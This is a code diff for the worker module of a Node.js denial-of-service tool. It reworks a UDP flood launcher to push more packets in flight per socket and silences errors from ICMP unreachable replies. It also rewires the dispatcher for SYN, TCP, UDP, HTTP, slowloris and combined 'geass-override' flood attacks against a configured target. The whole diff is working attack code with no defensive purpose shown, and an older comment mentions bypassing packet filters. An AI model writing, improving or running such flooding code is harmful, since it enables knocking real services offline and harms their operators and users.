@@ -141,6 +141,7 @@ async function runUDPFlood(
   const sockets = Array.from({length: numSockets}, () => {
     const s = dgram.createSocket("udp4");
     s.unref(); // don't keep process alive
+    s.on("error", () => {}); // absorb ICMP unreachable + port errors
     return s;
   });
 
@@ -151,33 +152,39 @@ async function runUDPFlood(
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // UDP launcher — fire-and-forget, no await on send callback
-  const udpLauncher = async (sock: dgram.Socket, sockIdx: number) => {
-    const itersPerYield = 50; // send 50 UDP packets then yield to event loop
-    let iter = 0;
-    while (!signal.aborted) {
-      const port   = PORTS[Math.floor(Math.random() * PORTS.length)];
-      const pktLen = randInt(PKT_MIN, PKT_MAX);
-      const buf    = Buffer.allocUnsafe(pktLen);
-      // Fill with random-ish data (bypass trivial packet filters)
-      buf.writeUInt32LE(randInt(0, 0xFFFFFFFF), 0);
-      buf.writeUInt32LE(Date.now(), 4);
+  // UDP launcher — callback-based for backpressure; each cb fires when kernel queued
+  const MAX_INFLIGHT_UDP = 200; // per socket
+  const udpLauncher = (sock: dgram.Socket): Promise<void> => new Promise<void>((resolve) => {
+    let inflight = 0;
 
-      sock.send(buf, port, resolvedHost); // FIRE — no callback, no wait
-      localPkts++;
-      localBytes += pktLen;
-
-      iter++;
-      if (iter >= itersPerYield) {
-        iter = 0;
-        await Promise.resolve(); // yield to event loop every N packets
+    const sendNext = () => {
+      if (signal.aborted) {
+        if (inflight === 0) { try { sock.close(); } catch { /**/ } resolve(); }
+        return;
       }
-    }
-    sock.close();
-  };
+      while (inflight < MAX_INFLIGHT_UDP && !signal.aborted) {
+        const port   = PORTS[Math.floor(Math.random() * PORTS.length)];
+        const pktLen = randInt(PKT_MIN, PKT_MAX);
+        const buf    = Buffer.allocUnsafe(pktLen);
+        buf.fill(0xDE); buf.writeUInt32BE(Date.now() >>> 0, 0);
+        inflight++;
+        sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
+          inflight--;
+          localPkts++;
+          localBytes += pktLen;
+          sendNext();
+        });
+      }
+    };
 
-  // Spread sockets across ports evenly
-  await Promise.all(sockets.map((s, i) => udpLauncher(s, i)));
+    signal.addEventListener("abort", () => {
+      if (inflight === 0) { try { sock.close(); } catch { /**/ } resolve(); }
+    }, { once: true });
+
+    sendNext();
+  });
+
+  await Promise.all(sockets.map(s => udpLauncher(s)));
   clearInterval(flushIv);
   flush();
 }
@@ -345,29 +352,33 @@ try {
 const base  = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
 const onStats = (p: number, b: number) => { parentPort?.postMessage({ pkts: p, bytes: b }); };
 
-// Run correct attack
-resolveHost(hostname).then(resolvedHost => {
-  const L4 = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
-  const UDP = new Set(["udp-flood","udp-bypass","icmp-flood","dns-amp","ntp-amp","ssdp-amp","mem-amp"]);
+// ── Worker entry — handle all errors gracefully ────────────────────────
+const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
+const UDP = new Set(["udp-flood","udp-bypass"]);
+
+async function runWorker() {
+  const resolvedHost = await resolveHost(hostname).catch(() => hostname);
 
   if (UDP.has(cfg.method)) {
-    return runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
   } else if (L4.has(cfg.method)) {
-    return runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
+    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
   } else if (cfg.method === "geass-override") {
-    // Triple vector — split threads across 3 sub-attacks
     const httpT    = Math.ceil(cfg.threads * 0.45);
     const tcpT     = Math.ceil(cfg.threads * 0.30);
     const exhaustT = Math.ceil(cfg.threads * 0.25);
-    return Promise.all([
-      runHTTPFlood(base,    httpT,    ctrl.signal, onStats),
+    await Promise.all([
+      runHTTPFlood(base,              httpT,    ctrl.signal, onStats),
       runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
-      runHTTPExhaust(base,  exhaustT, ctrl.signal, onStats),
-    ]).then(() => {});
+      runHTTPExhaust(base,            exhaustT, ctrl.signal, onStats),
+    ]);
   } else {
-    // HTTP methods (http-flood, http-bypass, http2-flood, slowloris, rudy)
-    return runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
+    await runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
   }
-}).then(() => {
-  parentPort?.postMessage({ done: true });
-});
+}
+
+runWorker()
+  .catch(() => { /* swallow all errors — worker exits cleanly */ })
+  .finally(() => {
+    parentPort?.postMessage({ done: true });
+  });
